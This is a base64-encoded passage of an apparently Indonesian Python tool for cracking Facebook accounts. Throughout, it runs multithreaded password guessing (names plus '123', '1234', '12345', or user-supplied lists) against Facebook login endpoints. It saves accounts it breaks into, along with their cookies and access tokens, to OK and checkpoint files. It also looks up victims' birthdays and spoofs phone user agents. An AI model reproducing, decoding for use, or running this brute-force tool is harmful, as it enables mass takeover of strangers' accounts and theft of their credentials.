Bhc3N3b3JkPyB5L246ICIpCgkJaWYgYXNrID09ICJ5IjoKCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6CgkJCQlwcmludCgiXG4gWypdIHBhc3MgZXhhbXBsZTogMTAyMDMwLCA1NTY2NzcsIDc4Njc4NiwgUmVkLCBIYWNrZXJzIikKCQkJCWFzdSA9IHJhd19pbnB1dCgiIFs/XSBzZXQgcGFzcyA6ICIpLnNwbGl0KCIsIikKCQkJCWlmIGxlbihhc3UpID09IiI6CgkJCQkJZXhpdCgiIFshXSBkb24ndCBiZSBlbXB0eSIpCgkJCQlwcmludCgiXG4gWytdIE9LIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogT0svJXMudHh0IiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFsrXSBDUCByZXN1bHRzIGFyZSBzYXZlZCBpbiA6IENQLyVzLnR4dFxuIiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFshXSBpZiBubyByZXN1bHQgdHVybiBvbiBhaXJwbGFuZSBtb2RlIDUgc2Vjb25kc1xuIikKCQkJCWZvciB1c2VyIGluIGlkOgoJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpCgkJCQkJY29lZy5zdWJtaXQoY3JhY2ssIHVpZCwgYXN1LCAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIikKCQkJZXhpdCgiXG5cbiBbI10gY3JhY2sgY29tcGxldGUuLi4iKQoJCWVsaWYgYXNrID09ICJuIjoKCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6CgkJCQlwcmludCgiXG4gWytdIE9LIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogT0svJXMudHh0IiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFsrXSBDUCByZXN1bHRzIGFyZSBzYXZlZCBpbiA6IENQLyVzLnR4dFxuIiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFshXSBpZiBubyByZXN1bHQgdHVybiBvbiBhaXJwbGFuZSBtb2RlIDUgc2Vjb25kc1xuIikKCQkJCWZvciB1c2VyIGluIGlkOgoJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpCgkJCQkJaWYgbGVuKG5hbWUpPj02OgoJCQkJCQlwd3ggPSBbIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQiLCBuYW1lKyIxMjM0NSIgXQoJCQkJCWVsaWYgbGVuKG5hbWUpID09IDMgb3IgbGVuKG5hbWUpID09IDQgb3IgbGVuKG5hbWUpID09IDU6CgkJCQkJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNCIsIG5hbWUrIjEyMzQ1IiBdCgkJCQkJZWxzZToKCQkJCQkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCQkJCQljb2VnLnN1Ym1pdChjcmFjaywgdWlkLCBwd3gsICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iKQoJCQlleGl0KCJcblxuIFsjXSBjcmFjayBjb21wbGV0ZS4uLiIpCgllbGlmIG1ldGhvZCA9PSAiNCI6CgkJYXNrID0gcmF3X2lucHV0KCIgWz9dIFVzZSBNYW51YWwgUGFzc3dvcmQ/IHkvbjogIikKCQlpZiBhc2sgPT0gInkiOgoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiBbKl0gcGFzcyBleGFtcGxlOiAxMDIwMzAsIDU1NjY3NywgNzg2Nzg2LCBSZWQsIEhhY2tlcnMiKQoJCQkJYXN1ID0gcmF3X2lucHV0KCIgWz9dIHNldCBwYXNzIDogIikuc3BsaXQoIiwiKQoJCQkJaWYgbGVuKGFzdSkgPT0iIjoKCQkJCQlleGl0KCIgWyFdIGRvbid0IGJlIGVtcHR5IikKCQkJCXByaW50KCJcbiBbK10gT0sgcmVzdWx0cyBhcmUgc2F2ZWQgaW4gOiBPSy8lcy50eHQiJSh0YW5nZ2FsKSkKCQkJCXByaW50KCIgWytdIENQIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogQ1AvJXMudHh0XG4iJSh0YW5nZ2FsKSkKCQkJCXByaW50KCIgWyFdIGlmIG5vIHJlc3VsdCB0dXJuIG9uIGFpcnBsYW5lIG1vZGUgNSBzZWNvbmRzXG4iKQoJCQkJZm9yIHVzZXIgaW4gaWQ6CgkJCQkJdWlkLCBuYW1lID0gdXNlci5zcGxpdCgiPD0+IikKCQkJCQljb2VnLnN1Ym1pdChjcmFjaywgdWlkLCBhc3UsICJodHRwczovL20uZmFjZWJvb2suY29tIikKCQkJZXhpdCgiXG5cbiBbI10gY3JhY2sgY29tcGxldGUuLi4iKQoJCWVsaWYgYXNrID09ICJuIjoKCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6CgkJCQlwcmludCgiXG4gWytdIE9LIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogT0svJXMudHh0IiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFsrXSBDUCByZXN1bHRzIGFyZSBzYXZlZCBpbiA6IENQLyVzLnR4dFxuIiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFshXSBpZiBubyByZXN1bHQgdHVybiBvbiBhaXJwbGFuZSBtb2RlIDUgc2Vjb25kc1xuIikKCQkJCWZvciB1c2VyIGluIGlkOgoJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpCgkJCQkJaWYgbGVuKG5hbWUpPj02OgoJCQkJCQlwd3ggPSBbIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQiLCBuYW1lKyIxMjM0NSIgXQoJCQkJCWVsaWYgbGVuKG5hbWUpID09IDMgb3IgbGVuKG5hbWUpID09IDQgb3IgbGVuKG5hbWUpID09IDU6CgkJCQkJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNCIsIG5hbWUrIjEyMzQ1IiBdCgkJCQkJZWxzZToKCQkJCQkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCQkJCQljb2VnLnN1Ym1pdChjcmFjaywgdWlkLCBwd3gsICJodHRwczovL20uZmFjZWJvb2suY29tIikKCQkJZXhpdCgiXG5cbiBbI10gY3JhY2sgY29tcGxldGUuLi4iKQoJCWVsc2U6CgkJCWV4aXQoIlxuIFshXSBjb3JyZWN0IGNvbnRlbnQiKQoJZWxzZToKCQltZW51KCkgCgpkZWYgYXBpKHVpZCwgcHd4KToKCXRyeToKCQl1YSA9IG9wZW4oIi51YSIsICJyIikucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQl1YSA9ICgiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iKQoJZ2xvYmFsIG9rLCBjcCwgbG9vcCwgdG9rZW4KCXN5cy5zdGRvdXQud3JpdGUoCgkJIlxyIFsqXSBjcmFjayAlcy8lcyBvazotJXMgLSBjcDotJXMgIiUobG9vcCwgbGVuKGlkKSwgbGVuKG9rKSwgbGVuKGNwKSkKCSk7IHN5cy5zdGRvdXQuZmx1c2goKQoJZm9yIHB3IGluIHB3eDoKCQlwdyA9IHB3Lmxvd2VyKCkKCQlzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkKCQloZWFkZXJzXyA9IHsieC1mYi1jb25uZWN0aW9uLWJhbmR3aWR0aCI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMDAwMC4wLCAzMDAwMDAwMC4wKSksICJ4LWZiLXNpbS1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksICJ4LWZiLW5ldC1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksICJ4LWZiLWNvbm5lY3Rpb24tcXVhbGl0eSI6ICJFWENFTExFTlQiLCAieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwgInVzZXItYWdlbnQiOiB1YSwgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAieC1mYi1odHRwLWVuZ2luZSI6ICJMaWdlciJ9CgkJc2VuZCA9IHNlcy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2Zvcm1hdD1qc29uJmVtYWlsPSIrc3RyKHVpZCkrIiZwYXNzd29yZD0iK3N0cihwdykrIiZjcmVkZW50aWFsc190eXBlPWRldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZlcnJvcl9kZXRhaWxfdHlwZT1idXR0b25fd2l0aF9kaXNhYmxlZCZzb3VyY2U9ZGV2aWNlX2Jhc2VkX2xvZ2luJm1ldGFfaW5mX2ZibWV0YT0lMjAmY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQ9MCZtZXRob2Q9R0VUJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9jYWxsZXJfY2xhc3M9Y29tLmZhY2Vib29rLmZvcy5oZWFkZXJzdjIuZmI0YW9yY2EuSGVhZGVyc1YyQ29uZmlnRmV0Y2hSZXF1ZXN0SGFuZGxlciZhY2Nlc3NfdG9rZW49MzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1hdXRoZW50aWNhdGUmY3BsPXRydWUiLCBoZWFkZXJzPWhlYWRlcnNfKQoJCWlmICJzZXNzaW9uX2tleSIgaW4gc2VuZC50ZXh0IGFuZCAiRUFBQSIgaW4gc2VuZC50ZXh0OgoJCQlwcmludCgiXHIgIFwwMzNbMDs5Mm0qIC0tPiAlc3wlc3wlc1wwMzNbMDs5N20iJSh1aWQsIHB3LCBzZW5kLmpzb24oKVsiYWNjZXNzX3Rva2VuIl0pKQoJCQlvay5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpCgkJCW9wZW4oIk9LLyVzLnR4dCIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiAgKiAtLT4gJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQlicmVhawoJCWVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHNlbmQuanNvbigpWyJlcnJvcl9tc2ciXToKCQkJdHJ5OgoJCQkJdG9rZW4gPSBvcGVuKCJsb2dpbi50eHQiLCAiciIpLnJlYWQoKQoJCQkJd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOgoJCQkJCXR0bCA9IHNlcy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyIlKHVpZCwgdG9rZW4pKS5qc29uKClbImJpcnRoZGF5Il0KCQkJCQltb250aCwgZGF5LCB5ZWFyID0gdHRsLnNwbGl0KCIvIikKCQkJCQltb250aCA9IGJ1bGFuX3R0bFttb250aF0KCQkJCQlwcmludCgiXHIgIFwwMzNbMDs5M20qIC0tPiAlc3wlc3wlcyAlcyAlc1wwMzNbMDs5N20iJSh1aWQsIHB3LCBkYXksIG1vbnRoLCB5ZWFyKSkKCQkJCQljcC5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpCgkJCQkJb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImEiKS53cml0ZSgiICAqIC0tPiAlc3wlc3wlcyAlcyAlc1xuIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpCgkJCQkJYnJlYWsKCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CgkJCQlkYXkgPSAoIiAiKQoJCQkJbW9udGggPSAoIiAiKQoJCQkJeWVhciA9ICgiICIpCgkJCWV4Y2VwdDpwYXNzCgkJCXByaW50KCJcciAgXDAzM1swOzkzbSogLS0+ICVzfCVzXDAzM1swOzk3bSAgICAgICAgIiUodWlkLCBwdykpCgkJCWNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkKCQkJb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImEiKS53cml0ZSgiICAqIC0tPiAlc3wlc1xuIiUodWlkLCBwdykpCgkJCWJyZWFrCgkJZWxzZToKCQkJY29udGludWUKCglsb29wICs9IDEKCmRlZiBjcmFjayh1aWQsIHB3eCwgaG9zdCwgKiprd2FyZ3MpOgoJdHJ5OgoJCXVhID0gb3BlbigiLnVhIiwgInIiKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIpCglnbG9iYWwgb2ssIGNwLCBsb29wLCB0b2tlbgoJc3lzLnN0ZG91dC53cml0ZSgKCQkiXHIgWypdIGNyYWNrICVzLyVzIG9rOi0lcyAtIGNwOi0lcyAiJShsb29wLCBsZW4oaWQpLCBsZW4ob2spLCBsZW4oY3ApKQoJKTsgc3lzLnN0ZG91dC5mbHVzaCgpCgl0cnk6CgkJZm9yIHB3IGluIHB3eDoKCQkJa3dhcmdzID0ge30KCQkJcHcgPSBwdy5sb3dlcigpCgkJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQoJCQlzZXMuaGVhZGVycy51cGRhdGUoeyJvcmlnaW4iOiBob3N0LCAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IiwgImFjY2VwdC1lbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwgImFjY2VwdCI6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwgInVzZXItYWdlbnQiOiB1YSwgIkhvc3QiOiAiIi5qb2luKGJzNC5yZS5maW5kYWxsKCI6Ly8oLio/KSQiLGhvc3QpKSwgInJlZmVyZXIiOiBob3N0KyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IiwgImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAiMSIsICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIn0pCgkJCXAgPSBzZXMuZ2V0KGhvc3QrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJnJlZmlkPTgiKS50ZXh0CgkJCWIgPSBwYXJzZXIocCwiaHRtbC5wYXJzZXIiKQoJCQlibCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiJdCgkJCWZvciBpIGluIGIoImlucHV0Iik6CgkJCQl0cnk6CgkJCQkJaWYgaS5nZXQoIm5hbWUiKSBpbiBibDprd2FyZ3MudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkKCQkJCQllbHNlOmNvbnRpbnVlCgkJCQlleGNlcHQ6cGFzcwoJCQlrd2FyZ3MudXBkYXRlKHsiZW1haWwiOiB1aWQsInBhc3MiOiBwdywicHJlZmlsbF9jb250YWN0X3BvaW50IjogIiIsInByZWZpbGxfc291cmNlIjogIiIsInByZWZpbGxfdHlwZSI6ICIiLCJmaXJzdF9wcmVmaWxsX3NvdXJjZSI6ICIiLCJmaXJzdF9wcmVmaWxsX3R5cGUiOiAiIiwiaGFkX2NwX3ByZWZpbGxlZCI6ICJmYWxzZSIsImhhZF9wYXNzd29yZF9wcmVmaWxsZWQiOiAiZmFsc2UiLCJpc19zbWFydF9sb2NrIjogImZhbHNlIiwiX2ZiX25vc2NyaXB0IjogInRydWUifSkKCQkJZ2FhYSA9IHNlcy5wb3N0KGhvc3QrIi9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8/cmVmc3JjPWh0dHBzJTNBJTJGJTJGbWJhc2ljLmZhY2Vib29rLmNvbSUyRiZsd3Y9MTAwJnJlZmlkPTgiLGRhdGE9a3dhcmdzKQoJCQlpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkKCQkJCXByaW50KCJcciAgXDAzM1swOzkybSogLS0+ICVzfCVzfCVzXDAzM1swOzk3bSIlKHVpZCwgcHcsIGt1a2kpKQoJCQkJb2suYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiT0svJXMudHh0IiUodGFuZ2dhbCksImEiKS53cml0ZSgiICAqIC0tPiAlc3wlc1xuIiUodWlkLCBwdykpCgkJCQlicmVhawoJCQllbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCXRyeToKCQkJCQl0b2tlbiA9IG9wZW4oImxvZ2luLnR4dCIsICJyIikucmVhZCgpCgkJCQkJd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOgoJCQkJCQl0dGwgPSBzZXMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMiJSh1aWQsIHRva2VuKSkuanNvbigpWyJiaXJ0aGRheSJdCgkJCQkJCW1vbnRoLCBkYXksIHllYXIgPSB0dGwuc3BsaXQoIi8iKQoJCQkJCQltb250aCA9IGJ1bGFuX3R0bFttb250aF0KCQkJCQkJcHJpbnQoIlxyICBcMDMzWzA7OTNtKiAtLT4gJXN8JXN8JXMgJXMgJXNcMDMzWzA7OTdtIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpCgkJCQkJCWNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkKCQkJCQkJb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImEiKS53cml0ZSgiICAqIC0tPiAlc3wlc3wlcyAlcyAlc1xuIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpCgkJCQkJCWJyZWFrCgkJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKCQkJCQlkYXkgPSAoIiAiKQoJCQkJCW1vbnRoID0gKCIgIikKCQkJCQl5ZWFyID0gKCIgIikKCQkJCWV4Y2VwdDpwYXNzCgkJCQlwcmludCgiXHIgIFwwMzNbMDs5M20qIC0tPiAlc3wlc1wwMzNbMDs5N20gICAgICAgICIlKHVpZCwgcHcpKQoJCQkJY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImEiKS53cml0ZSgiICAqIC0tPiAlc3wlc1xuIiUodWlkLCBwdykpCgkJCQlicmVhawoJCQllbHNlOgoJCQkJY29udGludWUKCgkJbG9vcCs9MQoJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJCWlmICJmcmVlLmZhY2Vib29rLmNvbSIgaW4gaG9zdDoKCQkJcmV0dXJuIGNyYWNrKHVpZCwgcHd4LCBob3N0KQoJCWVsc2U6CgkJCXJldHVybiBjcmFjayh1aWQsIHB3eCwgImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20iKQoKZGVmIHNldHRpbmdfdWEoKToKCXByaW50KCJcbiBbIENob29zZSBZb3VyIFBob25lIFVzZXIgQWdlbnQgXVxuIikKCXByaW50KCIgWzFdIFhpYW9taSIpCglwcmludCgiIFsyXSBTYW1zdW5nIikKCXByaW50KCIgWzNdIE5va2lhIikKCXByaW50KCIgWzRdIEFzdXMiKQoJcHJpbnQoIiBbNV0gSHVhd2VpIikKCXByaW50KCIgWzZdIE1hbnVhbCB1c2VyLWFnZW50IikKCXVhID0gcmF3X2lucHV0KCJcbiBbP10gQ2hvb3NlIDogIikKCWlmIHVhID09IiI6CgkJbWVudSgpCgllbGlmIHVhID09ICIxIjoKCQljX3VhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIpCgkJb3BlbigiLnVhIiwgInciKS53cml0ZShjX3VhKQoJCXRpbWUuc2xlZXAoMSkKCQlyYXdfaW5wdXQoIlxuIFsrXSBTdWNjZXNzZnVsbHkgQ2hhbmdlZCBVc2VyIEFnZW50IikKCQltZW51KCkKCWVsaWYgdWEgPT0gIjIiOgoJCWNfdWEgPSAoIkRhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgOC4wLjA7IFNNLUE3MjBGIEJ1aWxkL1IxNk5XKSBbRkJBTi9PcmNhLUFuZHJvaWQ7RkJBVi8xOTYuMC4wLjI5Ljk5O0ZCUE4vY29tLmZhY2Vib29rLm9yY2E7RkJMQy9pZF9JRDtGQkJWLzEzNTM3NDQ3OTtGQkNSL0FJUztGQk1GL3NhbXN1bmc7RkJCRC9zYW1zdW5nO0ZCRFYvU00tQTcyMEY7RkJTVjguMC4wO0ZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQl9GVy8xO10iKQoJCW9wZW4oIi51YSIsICJ3Iikud3JpdGUoY191YSkKCQl0aW1lLnNsZWVwKDEpCgkJcmF3X2lucHV0KCJcbiBbK10gU3VjY2Vzc2Z1bGx5IENoYW5nZWQgVXNlciBBZ2VudCIpCgkJbWVudSgpCgllbGlmIHVhID09ICIzIjoKCQljX3VhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC4xLjI7IE5va2lhX1ggQnVpbGQvSlpPNTRLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzAuMC4xNTk5LjgyIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikKCQlvcGVuKCIudWEiLCAidyIpLndyaXRlKGNfdWEpCgkJdGltZS5zbGVlcCgxKQoJCXJhd19pbnB1dCgiXG4gWytdIHN1Y2Nlc3NmdWxseSBjaGFuZ2VkIHVzZXIgYWdlbnQiKQoJCW1lbnUoKQoJZWxpZiB1YSA9PSAiNCI6CgkJY191YSA9ICgiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iKQoJCW9wZW4oIi51YSIsICJ3Iikud3JpdGUoY191YSkKCQl0aW1lLnNsZWVwKDEpCgkJcmF3X2lucHV0KCJcbiBbK10gc3VjY2Vzc2Z1bGx5IGNoYW5nZWQgdXNlciBhZ2VudCIpCgkJbWVudSgpCgllbGlmIHVhID09ICI1IjoKCQljX3VhID0gKCJbRkJBTi9GQjRBLEZCQVYvMjIyLjAuMC40OC4xMTM7RkJCVi8xNTUzMjMzNjY7RkJETS97ZGVuc2l0eT0yLjAsd2lkdGg9NzIwLGhlaWdodD0xMzYwfTtGQkxDL3NyX1JTO0ZCUlYvMTU2NjI1Njk2O0ZCQ1IvbXQ6cztGQk1GL0hVQVdFSTtGQkJEL0hVQVdFSSwuRkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTEROLUwyMTtGQlNWLzguMC4wO0ZCT1AvMTkuRkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpLF0iKQoJCW9wZW4oIi51YSIsICJ3Iikud3JpdGUoY191YSkKCQl0aW1lLnNsZWVwKDEpCgkJcmF3X2lucHV0KCJcbiBbK10gc3VjY2Vzc2Z1bGx5IGNoYW5nZWQgdXNlciBhZ2VudCIpCgkJbWVudSgpCgllbGlmIHVhID09ICI2IjoKCQljX3VhID0gcmF3X2lucHV0KCIgWytdIHVzZXItYWdlbnQgOiAiKQoJCWlmIGNfdWEgPT0gIiI6CgkJCWV4aXQoIlxuIFshXSBkb24ndCBiZSBlbXB0eSIpCgkJb3BlbigiLnVhIiwgInciKS53cml0ZShjX3VhKQoJCXRpbWUuc2xlZXAoMSkKCQlyYXdfaW5wdXQoIlxuIFsrXSBzdWNjZXNzZnVsbHkgY2hhbmdlZCB1c2VyIGFnZW50IikKCQltZW51KCkKCWVsc2U6CgkJbWVudSgpCgojLT4gQ2hlY2sgT3B0aW9ucwpkZWYgY2VrX29wc2koKToKCXByaW50KCJcbiBbKl0gaW5wdXQgZmlsZSAoZXg6IENQLyVzLnR4dCkiJSh0YW5nZ2FsKSkKCWZpbGVzID0gcmF3X2lucHV0KCIgWz9dIG5hbWEgZmlsZSAgOiAiKQoJaWYgZmlsZXMgPT0gIiI6CgkJbWVudSgpCgl0cnk6CgkJYnVrYV9iYWp1ID0gb3BlbihmaWxlcywgInIiKS5yZWFkbGluZXMoKQoJZXhjZXB0IElPRXJyb3I6CgkJZXhpdCgiXG4gWyFdIGZpbGUgbmFtZSAlcyBub3QgYXZhaWxhYmxlIiUoZmlsZXMpKQoJcHJpbnQoIiBbK10gVG90YWwgQWNjb3VudCAgOiBcMDMzWzA7OTFtJXNcMDMzWzA7OTdtIiUobGVuKGJ1a2FfYmFqdSkpKQoJcHJpbnQoIiBbKl0gaW4gdGhlIHByb2Nlc3Mgb2YgY2hlY2tpbmcgdGhlIGFjY291bnQuLi4uIikKCWZvciBtZW1layBpbiBidWthX2JhanU6CgkJa29udG9sID0gbWVtZWsucmVwbGFjZSgiXG4iLCIiKQoJCXRpdGlkICA9IGtvbnRvbC5zcGxpdCgifCIpCgkJcHJpbnQoIlxuIFsrXSBjaGVjayBhY2NvdW50IDogXDAzM1swOzkzbSVzXDAzM1swOzk3bSIlKGtvbnRvbC5yZXBsYWNlKCIgICogLS0+ICIsIiIpKSkKCQl0cnk6CgkJCWNoZWNrX2luKHRpdGlkWzBdLnJlcGxhY2UoIiAgKiAtLT4gIiwiIiksIHRpdGlkWzFdKQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJcGFzcwoJcHJpbnQoIlxuIFshXSBBY2NvdW50IENoZWNrIERvbmUuLi4iKQoJcmF3X2lucHV0KCIgWytdIHBlbmNldCBlbnRlciB1bnR1ayBrZW1iYWxpIGtlIG1lbnUgIikKCXRpbWUuc2xlZXAoMSkKCW1lbnUoKQoKZGVmIGNoZWNrX2luKHVzZXIsIHBhc3cpOgoJbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpCgl1YSA9ICgiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIpCglzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkKCSMtPiBzZXBhcmF0b3IKCXNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiAibWJhc2ljLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6ICIxIiwib3JpZ2luIjogbWIsImNvbnR